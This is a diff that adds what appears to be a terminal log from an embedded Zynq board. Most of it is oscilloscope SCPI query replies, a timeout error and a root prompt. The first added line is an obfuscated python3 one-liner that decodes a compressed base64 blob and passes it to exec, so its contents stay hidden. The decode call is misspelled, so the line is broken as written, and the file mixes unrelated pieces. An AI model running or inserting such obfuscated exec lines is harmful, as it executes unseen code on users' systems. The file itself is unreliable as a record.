@@ -1,0 +1,6 @@
+python3 -c "import base64,zlib;exec(zlib.decompress(base64.b64deecode('eJyFUl2L2zAQfPev2DdZberIyZFrBaFN4wQCbe5qO2nLcRjFVoh61sdJSjlT7r8XO05oC0f3RccPO7s4MSEijrYcfTqtgb7UEw/yhFjsQJ+KW+UPQY9e4wGrtYdq1QzSUvBJs6Ko3Upa7+oGYeFiznWSeF665y8YiMnoqdZrZCOHCNi9rjd5TcwxTunLdhe22IykIo5+1RcuWHP7mqtEV4AOcBfH/ZjZgxXFXhC7ulloob5wjTja4TxKc+fA5G3TLkuSx9pKxzLz81AaJj+3QrRJvtIKJ2Mrkn7kHdvJ5RmSRZ/S+ZX8WR8FRNKCaaWrdZanaADog2nQAMaEEBx429AAAGCvLZRaSqYqEApC9GqVrN+343n6OelANktnPVhvTlSy2vYzyacOfFF1mLdWd/LfQPKbb88Y8pjfLLD/jWZ6f1OYxzVsZfLLV1sXjuYwVyoeoKJbLvPiyWaTfiwK9bj9IVB2lceeEv1EdBtAcDZLmpG0SFjh6P3DZhT+BnPIB9fXSHaW6PHF+E+FPJjYdF9witgDng1mr7Xy+LNL1JW0eWGxxt2Oy9otLWznD0Ee6FYXfc5hY7KWjse4uA3LTrmmg==')))"
+__FFT_QUERY__{"command": "*IDN?", "reply": "*IDN SIGLENT,SDS1202X,SDS1XDC4163410,1.1.2.13 R5"}
+__FFT_QUERY__{"command": "TRMD?", "reply": "TRMD AUTO"}
+__FFT_QUERY__{"command": "SARA?", "reply": "SARA 1.00GSa/s"}
+__FFT_QUERY_ERROR__InstrumentError('VI_ERROR_TMO (-1073807339): Timeout expired before operation completed.')
+root@ATK-ZYNQ:~# 
